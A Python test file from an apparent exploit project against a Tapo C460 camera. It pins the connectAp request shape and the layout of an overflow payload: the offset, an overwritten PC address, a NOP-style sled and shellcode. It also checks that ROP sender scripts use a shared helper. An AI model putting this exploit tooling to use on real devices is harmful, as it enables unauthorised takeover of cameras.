#!/usr/bin/env python3
"""Contract test for the connectAp request shape (fss-tapo-460-root-zhhtf).

The camera refused every shot for days because the connect object was wrapped in
`params.onboarding.connect`. Measured on a live C460: the wrapped shape answers -40209 (small
payload) or -40214 (full payload), the flat shape answers error_code 0. Nothing about address or
offset could matter while the parse rejected the frame.

This pins the shape and the payload geometry so the wrapper cannot come back:

  shape      connect_params() returns the connect object itself — no `onboarding` key
  callers    every sender builds its body from connect_params (no second inline copy)
  geometry   build(offset, sled) is offset + sled + shellcode long, and the overwrite sits at
             the offset

  python3 tests/tapo_params_test.py
"""
import base64
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
SCRIPTS = os.path.normpath(os.path.join(HERE, "..", "deliverables", "scripts"))
sys.path.insert(0, SCRIPTS)

import tapo_connectap_sc as T  # noqa: E402

REQUIRED = {"ssid", "bssid", "auth", "encryption", "rssi", "password", "unique_key", "band"}


def test_shape_is_flat():
    p = T.connect_params("QUJD", "Aardvark", "00:00:00:00:00:00")
    assert "onboarding" not in p, "the wrapper is refused with -40209/-40214; connect IS params"
    assert REQUIRED <= set(p), "missing keys: %s" % (REQUIRED - set(p))
    assert p["password"] == "QUJD"
    assert isinstance(p["unique_key"], int), "unique_key must be an integer, not a string"
    assert p["encryption"] == 3 and p["auth"] == 1


def test_callers_use_the_helper():
    """A second inline copy of the body is how the wrapper survived three fixes."""
    for name in ("tapo_connectap_rop.py", "rop_burst.py", "rop_burst_daemon.py"):
        src = open(os.path.join(SCRIPTS, name)).read()
        assert "connect_params" in src, "%s should build its body via connect_params" % name
        assert '"onboarding"' not in src, "%s still carries an onboarding body" % name


def test_payload_geometry():
    off, sled = 1024, 512
    raw = base64.b64decode(T.build(off, None, 0xbee80000, sled=sled, padpc=1, prefix=b"",
                                   bare=False, sledfill=True, pcround=0x1000))
    assert len(raw) > off + sled, "payload must be filler + pc + sled + shellcode"
    low = 0xbee80000 & ~0xFFF
    assert raw[off:off + 4] == low.to_bytes(4, "little"), "the rounded address must sit at the offset"
    assert raw[off - 4:off] == T.SLED, "sledfill must put sled bytes immediately before the pc"


def test_bare_stops_at_the_word():
    off = 256
    raw = base64.b64decode(T.build(off, None, 0xbee80000, sled=0, padpc=1, prefix=b"",
                                   bare=True, sledfill=True))
    assert len(raw) == off + 4, "bare payload is exactly the offset plus the overwritten word"


if __name__ == "__main__":
    for fn in (test_shape_is_flat, test_callers_use_the_helper,
               test_payload_geometry, test_bare_stops_at_the_word):
        fn()
        print("ok  %s" % fn.__name__)
